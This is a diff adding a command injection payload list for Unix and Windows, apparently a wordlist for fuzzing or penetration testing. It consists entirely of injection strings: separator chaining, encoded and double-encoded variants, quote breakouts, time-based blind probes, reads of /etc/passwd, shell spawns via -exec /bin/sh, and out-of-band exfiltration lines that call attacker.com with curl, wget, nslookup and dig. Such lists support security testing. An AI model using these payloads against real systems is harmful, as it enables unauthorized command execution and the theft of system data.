@@ -1,0 +1,283 @@
+# Command Injection Payloads
+# OS command execution via various injection points
+# Covers Unix/Linux and Windows
+
+# Basic Unix/Linux
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+;ls -la
+;pwd
+|id
+|whoami
+|uname -a
+|cat /etc/passwd
+|ls -la
+||id
+||whoami
+||ls
+&&id
+&&whoami
+&&ls
+`id`
+`whoami`
+`uname -a`
+$(id)
+$(whoami)
+$(uname -a)
+$(cat /etc/passwd)
+
+# Command substitution
+;$(whoami)
+|$(whoami)
+||$(whoami)
+&&$(whoami)
+`$(whoami)`
+$(echo$(whoami))
+
+# Newline injection
+%0aid
+%0awhoami
+%0acat /etc/passwd
+%0d%0aid
+%0d%0awhoami
+\nid
+\nwhoami
+\n/bin/cat /etc/passwd
+
+# Semicolon chaining
+;id;
+;whoami;
+;id;whoami;ls;
+command;id
+test;id
+a]];id
+a]];id;
+1;id
+1;whoami
+
+# Pipe chaining
+|id|
+|whoami|
+command|id
+test|id
+1|id
+1|whoami
+a]|id
+echo test|id
+
+# Double pipe (OR)
+||id||
+||whoami||
+command||id
+test||id
+false||id
+xxx||id
+
+# Double ampersand (AND)
+&&id&&
+&&whoami&&
+command&&id
+test&&id
+true&&id
+xxx&&id
+
+# Backticks
+`id`
+`whoami`
+`cat /etc/passwd`
+`sleep 5`
+echo `id`
+test`id`
+
+# Dollar parentheses
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$(sleep 5)
+echo $(id)
+test$(id)
+$((id))
+
+# Blind command injection (time-based)
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep 5;
+|sleep 5|
+;ping -c 5 127.0.0.1
+;ping -c 10 127.0.0.1
+
+# Blind with curl/wget (OOB)
+;curl http://attacker.com/`whoami`
+;curl http://attacker.com/?x=$(whoami)
+;wget http://attacker.com/$(whoami)
+;wget http://attacker.com/?x=`id`
+|curl attacker.com/`id`
+$(curl attacker.com/?c=$(id))
+
+# DNS exfiltration
+;nslookup `whoami`.attacker.com
+;host `id`.attacker.com
+;dig `whoami`.attacker.com
+$(nslookup $(whoami).attacker.com)
+
+# Windows specific
+;dir
+;whoami
+;ipconfig
+;net user
+;type C:\Windows\win.ini
+|dir
+|whoami
+|ipconfig
+|net user
+||dir
+||whoami
+&&dir
+&&whoami
+&dir
+&whoami
+
+# Windows pipes and ampersands
+|dir|
+&dir&
+||dir||
+&&dir&&
+| dir
+& dir
+|| dir
+&& dir
+
+# Windows newlines
+%0adir
+%0dwhoami
+%0d%0adir
+%0d%0awhoami
+
+# Windows environment variables
+%COMSPEC% /c dir
+%SYSTEMROOT%\System32\cmd.exe /c dir
+cmd.exe /c dir
+powershell.exe -c "whoami"
+powershell -command "Get-Process"
+
+# Windows time-based
+& ping -n 5 127.0.0.1 &
+| ping -n 5 127.0.0.1 |
+;ping -n 5 127.0.0.1
+&& timeout /t 5
+|| timeout /t 5
+
+# Encoded payloads
+%3Bid
+%3Bwhoami
+%7Cid
+%7Cwhoami
+%26%26id
+%26id
+%60id%60
+%24%28id%29
+
+# Double encoding
+%253Bid
+%253Bwhoami
+%257Cid
+%257Cwhoami
+
+# Quote breakout
+";id
+';id
+`;id
+";id;#
+';id;#
+`id`
+"$(id)"
+'$(id)'
+";$(id);#
+';$(id);#
+
+# Argument injection
+--help
+-h
+--version
+-v
+--help;id
+-v;id
+-la;id
+--file=/etc/passwd
+-o /tmp/test
+-exec cat /etc/passwd ;
+-exec /bin/sh ;
+-exec id ;
+
+# Expression injection (varies by context)
+${{id}}
+#{id}
+*{id}
+
+# Glob patterns
+/???/??? (expands to /bin/cat on some systems)
+/???/??t /???/??ss?? (cat /etc/passwd)
+
+# Null byte injection
+;id%00
+;id%00.txt
+;id\x00
+;id\0
+
+# Comments
+;id #comment
+;id //comment
+;id /*comment*/
+
+# Tab separation
+;id	
+	;id
+
+# Complex chaining
+;id;whoami;pwd;
+|id|whoami|pwd
+&&id&&whoami&&pwd
+;(id);(whoami);
+|(id)|(whoami)
+`id;whoami;pwd`
+$(id;whoami;pwd)
+
+# Subshell
+;(id)
+|(id)
+;(/bin/sh -c id)
+|/bin/sh -c id
+;bash -c 'id'
+|bash -c "whoami"
+;sh -c id
+;/bin/bash -c 'cat /etc/passwd'
+
+# PATH manipulation
+;/bin/id
+;/usr/bin/id
+;/bin/cat /etc/passwd
+;/usr/bin/whoami
+|/bin/id
+
+# Redirect and append
+;id > /tmp/test
+;cat /etc/passwd > /tmp/out
+;id >> /tmp/test
+;echo test >> /tmp/file
+|id > /tmp/test
+
+# Input redirect
+;cat < /etc/passwd
+;/bin/sh < /tmp/script
+|cat < /etc/passwd
+
+# Here document
+;cat << EOF
+id
+EOF
